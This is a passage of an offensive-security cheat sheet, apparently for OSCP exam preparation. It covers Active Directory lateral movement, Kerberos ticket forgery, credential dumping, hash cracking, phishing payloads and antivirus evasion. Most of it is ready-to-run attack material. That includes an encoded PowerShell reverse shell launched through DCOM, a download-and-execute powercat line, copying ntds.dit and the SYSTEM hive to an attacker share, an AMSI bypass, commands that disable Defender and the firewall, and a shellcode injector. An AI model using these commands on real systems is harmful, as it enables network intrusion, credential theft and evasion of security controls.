impacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'
```

WinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.

```SHELL
#if port 5985 is open:
# -s to include scripts
evil-winrm -i 172.16.238.11 -u joe -H 08d7a47a6f9f66b97b1bae4178747494 
```

### Overpass-the-Hash

Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. 

**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your `/etc/hosts` file).

```powershell
# using mimikatz
privilege::debug
# grab hash:
sekurlsa::logonpasswords
# perform overpass-the-hash, starting powershell window as user
# alternatively, kick off reverse shell
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell
# in new powershell session, interact to get/cache TGT (and TGS):
net use \\VICTIM
# inspect that you have TGT now
klist
# ready to use this session with creds (see psexec cmd below)


# using Rubeus
# be sure to use format "corp.com" for DOMAIN
.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt


# now you can use PsExec in context of stolen user
.\PsExec.exe -accepteula \\VICTIM cmd
# note, the spawned shell will be under stolen user, not SYSTEM
```

On Kali, use impacket:

```sh
# be sure to use format "corp.com" for DOMAIN
impacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
# this spawned shell will (still) be SYSTEM
# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP

# if you get the error:
[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
# check that the target IP is correct/matches the victim hostname

# USE THIS
# you can also do overpass-the-hash directly with one command:
impacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN
```

### Pass-the-Ticket

In Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.

Acquiring tickets with Rubeus:

```powershell

https://github.com/Flangvik/SharpCollection

# from elevated cmd prompt
# list all tickets in memory
.\Rubeus.exe triage

# dump desired tickets (base64 encoded .kirbi printed to stdout)
.\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]

# load the ticket into session (copy and paste base64 kirbi data from previous)
.\Rubeus.exe ptt /ticket:BASE64_KIRBI
```

Using saved tickets from Kali:

```sh
# if you have base64 ticket from Rubeus, convert to .kirbi first
echo -n "BASE64_KIRBI" | base64 -d > USERNAME.kirbi

# convert .kirbi to .ccache
impacket-ticketConverter USERNAME.kirbi USERNAME.ccache

# export path to .ccache to use with other tools
export KRB5CCNAME=$(pwd)/USERNAME.ccache

# use with crackmapexec, impacket-psexec/wmiexec/smbexec
# make sure you set /etc/hosts to reslove FQDN for crackmapexec
crackmapexec smb --use-kcache VICTIM_FQDN
impacket-psexec -k -no-pass VICTIM_FQDN
```

### DCOM

Interaction with DCOM is performed over RPC on TCP port 135 and local **administrator access is required** to call the 

```powershell
# variable declaration
$victim = 'VICTIM' # hostname or IP
$lhost = 'LISTEN_IP'
$lport = 443
$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
# create the DCOM MMC object for the remote machine
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$victim))
# execute shell command through DCOM object
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
# ExecuteShellCommand accepts 4 parameters:
# Command, Directory, Parameters, and WindowState (7 is hidden).
```

# Attacking Active Directory Authentication

### AS-REP Roasting (user acct)

AS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.

Enumerating for users that are AS-REP Roastable:

```powershell
# Windows: using PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname


impacket-GetNPUsers -dc-ip 172.16.93.6  -request -outputfile hashes.asreproast relia.com/jim

```

Collecting hashes using AS-REP Roast attack:

```powershell
# Windows: use Rubeus.exe (can use /format:hashcat interchangably)
.\Rubeus.exe asreproast /format:john /outfile:asreproast.hash
# push to stdout instead of file
.\Rubeus.exe asreproast /nowrap
```

Cracking the AS-REP roast hashes:

```sh
# using John-the-Ripper (auto-detects krb5asrep format)
john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash

# using hashcat
hashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt
```

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:

```powershell
# using Microsoft ActiveDirectory Module
get-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true

# using AD Provider
$flag = (Get-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol).useraccountcontrol -bor 0x400000
Set-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol -Value "$flag" -Confirm:$false

# using ADSI accelerator (legacy, may not work for cloud-based servers)
$user = [adsi]"LDAP://$DISTINGUISHED_NAME"
$flag = $user.userAccountControl.value -bor 0x400000
$user.userAccountControl = $flag
$user.SetInfo()
```

### Kerberoasting (serviceacct)

Kerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.

It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.

Obtaining the SPN Hashes:

```powershell
# Windows: using PowerView.ps1
Invoke-Kerberoast | fl

# Windows: using Rubeus
# '/tgtdeleg' tries to downgrade encryption to RC4
.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash

#from kali 
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

Cracking the kerberoast hashes:

```sh
# using John-the-Ripper (auto-detects krb5tgs format)
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash

# using hashcat
hashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt
```

If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC.

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.

Once you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.

```python
import hashlib
h = hashlib.new("md4", "SPN_PASSWORD".encode("utf-16le")).hexdigest()
print(h)
```


### Silver Ticket

That means that an attacker with the SPN password (see [Kerberoasting](#5.2.4%20Kerberoasting)) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.

We need to collect the following three pieces of information to create a silver ticket:

- SPN password hash (can get with mimikatz when SPN has session on your computer)
- Domain SID (extract from user SID)
- Target SPN

Getting prerequisite info:

```powershell
# use mimikatz to get SPN NTLM hash
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords

# extract the Domain SID from the user SID (everything but RID, numbers after last dash)
whoami /user

# list SPNs from specific host
setspn -l HOSTNAME
# example for IIS server: HTTP/web04.corp.com:80
```

Create silver ticket (you can use any valid username):

```powershell
# in mimikatz:
# /ptt - pass the ticket; auto-injects it into memory
kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER

# TODO: figure out how to do this with Rubeus.exe
# Rubeus lets you ask for tickets for all services at once:
# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
.\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]

# Kali: get SIDs with crackmapexec
crackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid

# Kali: use impacket
# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
impacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache 
impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
```

Confirm ticket is loaded in memory on Windows host:

```powershell
# list kerberos tickets available to user
klist

# make web request with silver ticket
iwr -UseDefaultCredentials http://VICTIM
```

Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).

# Active Directory Persistence

### 5.4.1 Domain Controller Synchronization (DCSync)

DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.

When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.

To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.

Performing dcsync attack:

```powershell
# From inside mimikatz shell
# grab all hashes from DC
lsadump::dcsync
# grab hashes of specific user
lsadump::dcsync /user:corp\Administrator

# Kali: use impacket
# full dump of hashes
# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
# grab specific user's hashes
impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
```

Crack dumped NTLM hashes:

```sh
❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
```


### 5.4.2 Volume Shadow Copy

Domain Admins can abuse shadow copies to obtain a copy of the `ntds.dit` file (the Active Directory database, containing all user credentials).

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary `vshadow.exe`, part of the Windows SDK. They can also be created using WMI.

```powershell
# from elevated terminal session:

# create volume shadow copy of C: drive
# -nw : no writers (to speed up creation)
# -p : store copy on disk
vshadow.exe -nw -p  C:
# pay attention to Shadow copy device name
# line under * SNAPSHOT ID = {UUID}
#    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# create SMB session with hacker machine
net use \\ATTACKER_IP herpderp /user:derp

# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\ATTACKER_IP\share\ntds.dit.bak

# save copy of SYSTEM registry hive onto attacker machine
# this contains the encryption keys for the ntds.dit file
reg.exe save hklm\system \\ATTACKER_IP\share\system.hiv

# on Kali, use secretsdump to extract hashes
impacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL
```

Alternative ways to create shadow copies, plus ways of working with them:

```powershell
# create shadow copy with wmic:
wmic shadowcopy call create volume=c:\

# create with PowerShell
([WMICLASS]"root\cimv2:win32_shadowcopy").create("C:\","ClientAccessible")

# list all volume shadow copies for C: drive
vssadmin list shadows /for=C:

# list using Powershell (shows date created)
Get-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject

# if you want to browse the files in the shadow copy, mount it:
# Note the trailing slash at the end of the shadow copy device name's path!
mklink /D C:\users\Public\stuff SHADOWCOPYDEVNAME\
```

`Secretsdump` also supports the VSS method directly:

```sh
# perform VSS technique all in one go using secretsdump (-use-vss flag)
impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP
```


### 5.4.3 Golden Ticket

A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.

Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.

Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.

```powershell
# extract the Domain SID from the user's SID
# (remove the RID and keep the rest. RID is last set of numbers in SID)
whoami /user

# in mimikatz shell
privilege::debug
# remove all existing tickets, so they don't conflict with the one you're forging
kerberos::purge
# forge golden ticket, load into memory with /ptt
# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
# use '/aes256:' for AES256 kerberos hash
kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
# start cmd shell with new ticket in its context
misc::cmd cmd

# alternatively, use Rubeus (/aes256: if desired)
.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
# here's loading a saved ticket:
.\Rubeus.exe ptt /ticket:ticket.kirbi

# list tickets in memory, make sure its there
klist

# now use overpass-the-hash technique (full domain name required)
.\PsExec.exe \\dc1 cmd.exe
```

You can forge a Golden Ticket on Kali:

```sh
# look up domain SID
impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM

# use -aesKey for AES256 hashes
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
```

Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.

```powershell
# Get user RID
whoami /user

.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```



## Cracking Password Hashes

``` shell 
# good wordlist
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt

# specify mangling rules with addition of:
-r /usr/share/hashcat/rules/best64.rule
# more extensive rule list:
-r /usr/share/hashcat/rules/d3ad0ne.rule
# Great one for rockyou.txt:
-r /usr/share/hashcat/rules/rockyou-30000.rule

```

### Cracking

```sh
hashcat --help | grep -i "md5"

#cracking shadow
john hashes.txt
# cracking /etc/shadow with sha512crypt hashes ("$6$...")
hashcat -m1800 -a0 -w3 hashes.txt /usr/share/wordlists/rockyou.txt

#ssh
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 kiero.ssh.hash /usr/share/wordlists/rockyou.txt --force

# convert to friendly format
keepass2john Database.kdbx > keepass.hash
# remove "Database:" from beginning
vim keepass.hash

# crack with rockyou + rules
hashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt

#open kdbx file in linux 
keepassxc
```

### LSA hashes cracking

Follow the guide below:
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials


## Client-Side Attacks

### HTA Files

Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).

Send one of these files to a user (or a link to one), and if they execute it, you win.

Here's the basic template (save as `derp.hta`):

```html
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```

You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:

```sh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
```


### Windows Library Files


First, start your WebDAV server:

```sh
# start the server with open access
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
```

Open Visual Studio Code. In the menu bar, we'll click on _File_ > _New Text File_. We'll then save the empty file as **config.Library-ms** on the _offsec_ user's desktop with the following block:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.230</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

```

Double click on config to verify it opens in file explorer. 

Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select _New_ > _Shortcut_. A

```powershell
python3 -m http.server 8000

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.230:8000/powercat.ps1'); powercat -c 192.168.45.230 -p 4444 -e powershell"
```

THEN COPY THE SHORTCUT AND THE CONFIG FILE INTO THE CONFIG FOLDER IN FILE EXPLORER

The complete command is shown in the following listing. Once entered, we have to provide the credentials of _john_:

```shell
swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.197.191 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: DPuBT9tGCBrTbR

```

### Office/libreoffice Macros

For Libreoffice, use the python shell here:
https://github.com/0bfxgh0st/MMG-LO


Because VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a `powercat.ps1` reverse shell payload into the string.

- [mkpowercat.py](tools/win/mkpowercat.py)
- [vbsify.py](tools/win/vbsify.py)

Example Usage:

```sh
# create powercat macro payload
./mkpowercat.py | ./vbsify.py

# put powercat in current directory
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# host file on http server
python3 -m http.server 80

# catching reverse shell callback:
nc -lvnp 443
```

Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.


## Compiling exploits 

```shell 
gcc main.c -L/usr/lib -lssl -lcrypto -o main
gcc -s poc.c -o ptrace_traceme_root
use -m32 for 32 bit compilation
```

### Cross-Compiling Windows Binaries on Linux

You can use `mingw` to cross-compile C files.

```sh
# make sure you link Winsock with `-lws2_32` when using winsock.h
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

# you can test that windows EXE's run as expected by using 'wine':
wine syncbreeze_exploit.exe
```

## 3.4 Metasploit

The Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.

Initializing Metasploit (first time running it):

```sh
# initialize the metasploit postgres database
sudo msfdb init

# enable postgres to start on boot
sudo systemctl enable postgresql
```

After the database starts, you can use any of the following commands to manage the database:

- `msfdb reinit` - Deletes and reinitializes the database.
- `msfdb delete` - Deletes the database.
- `msfdb start` - Starts the database.
- `msfdb stop` - Stops the database.
- `msfdb status` - Shows the database status.

### 3.4.1 Interacting with Metasploit via `msfconsole`

Detailed interaction reference:

```sh

# inside the msfconsole:

# check the database status
msf6> db_status
# check what workspace you're using
# workspaces help isolate data from different assessments/subnets
# (the database saves everything)
msf6> workspace
# add a workspace
msf6> workspace -a NAME
# change workspaces
msf6> workspace OTHERNAME
# delete workspace
msf6> workspace -d NAME

# using data stored in the database:
# run nmap scan and save results to msfdb workspace
msf6> db_nmap <nmap-options>
# list all discovered hosts in msfdb workspace
msf6> hosts
# NOTE: you an tag hosts and search by tags.
# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole
# list all discovered services
msf6> services
# list all discovered services for port 8000
msf6> services -p 8000
# check if metasploit automatically detected any vulnerabilities
msf6> vulns
# view any saved/discovered credentials from brute force scans
msf6> creds

# resume interaction on backgrounded session
msf6> sessions -i SESS_ID
sessions -k 1

# clear all routes from table
msf6> route flush


#Route Management with Multi/manage/autoroute and SOCKS Proxy:
- Use the "multi/manage/autoroute" auxiliary module: use multi/manage/autoroute
- Use the "auxiliary/server/socks_proxy" auxiliary module: use auxiliary/server/socks_proxy
- Set the server's host to 127.0.0.1 and version to 5: set SRVHOST 127.0.0.1 and set VERSION 5
- Run the module with the option to run in the background: run -j

```

### 3.4.3 Meterpreter command basics

One payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).

```sh
# view list of meterpreter commands
meterpreter> help
# get information about victim system
meterpreter> sysinfo
# get username
meterpreter> getuid
# drop into interactive bash/cmd.exe shell
meterpreter> shell
# to suspend the shell to background, use Ctrl+z
# list backgrounded shells (called 'channels'):
meterpreter> channel -l
# interact with backgrounded channel (shell)
meterpreter> channel -i NUM
# download file from victim
meterpreter> download /etc/passwd
# upload file to victim
meterpreter> upload /usr/bin/unix-privesc-check /tmp/
# attempt to auto-privesc to SYSTEM (on Windows host)
meterpreter> getsystem
# migrate your process to the memory of another process
meterpreter> ps # find another process running with same user as you
meterpreter> migrate PID # move your process to the memory of another process
# spawn a process hidden ('-H') from user (no window)
meterpreter> execute -H -f iexplore.exe
# use mimikatz functionality to grab credentials
meterpreter> load kiwi
meterpreter> creds_all
# add local port forward rule via meterpreter
meterpreter> portfwd add -l LPORT -p RPORT -r RHOST
# send this meterpreter session to background (return to msf console)
meterpreter> bg
# shut down meterpreter agent
meterpreter> exit

#autopwn linux
https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/

#if stuck in shell
upload reverse.sh
chmod 777 reverse.sh
excute -f ./reverse.sh
```


## Antivirus & Firewall Evasion

### 4.3.2 Shellter

You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.

To check that your exploit works:

```sh
# start listener for reverse shell
sudo nc -lvnp 443

# run shellter-injected binary with wine
wine derp.exe
```

**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.


### 4.3.3 Windows Process Injection

The general technique for injecting shellcode into another (running) process goes like this:

1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
2. ***VirtualAllocEx*** - Allocate memory within the target process
3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process

These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).

Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:

```powershell
$imports = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;

# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0
[Byte[]];
[Byte[]]$s = <SHELLCODE HERE>;

$size = 0x1000;

if ($s.Length -gt 0x1000) {$size = $s.Length};

$x = $w::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};

$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```



### 4.3.4 Windows AMSI Bypass

This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
will e.g. block malicious powershell scripts from running. If you get a warning
saying something like "This script contains malicious content and has been blocked
by your antivirus software", then run this command to disable that blocker.

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).



### 4.3.5 Turn off Windows Firewall

```powershell
# must be done from administrator prompt
# Disable Windows firewall on newer Windows:
netsh advfirewall set allprofiles state off

# Disable Windows firewall on older Windows:
netsh firewall set opmode disable
```



### 4.3.6 Turn off Windows Defender

```powershell
# must be running powershell as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true

# for completely removing Windows Defender (until next Windows update)
Uninstall-WindowsFeature -Name Windows-Defender
```

Alternatively, you should be able to do it with services:

```powershell
sc config WinDefend start= disabled
sc stop WinDefend

# to restart Defender
sc config WinDefend start= auto
sc start WinDefend
```


### 4.3.7 Windows Encoding/Decoding with LOLBAS

```powershell
# base64 encode a file
certutil -encode inputFileName encodedOutputFileName
# base64 decode a file
certutil -decode encodedInputFileName decodedOutputFileName
# hex decode a file
certutil --decodehex encoded_hexadecimal_InputFileName
# MD5 checksum
certutil -hashfile somefile.txt MD5
```


### 4.3.8 Execute Inline Tasks with MSBuild.exe

MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
C#/.NET code inline. Modify the XML file below with your shellcode from
msfvenom's "-f csharp" format (or build a payload with Empire's
windows/launcher_xml stager, or write your own C# and host over SMB)

To build:
```powershell
# locate MSBuild executables
dir /b /s C:\msbuild.exe

# execute 32-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml

# execute 64-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
```

Here's the payload.xml template to inject your shellcode into (if not building
with Empire)

```xml
<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
     shellcode, and build with 64-bit MSBuild.exe
     Building Shellcode:
     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <!-- to host code remotely, instead use:
      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
      -->
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
          private static UInt32 MEM_COMMIT = 0x1000;
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
          [DllImport("kernel32")]
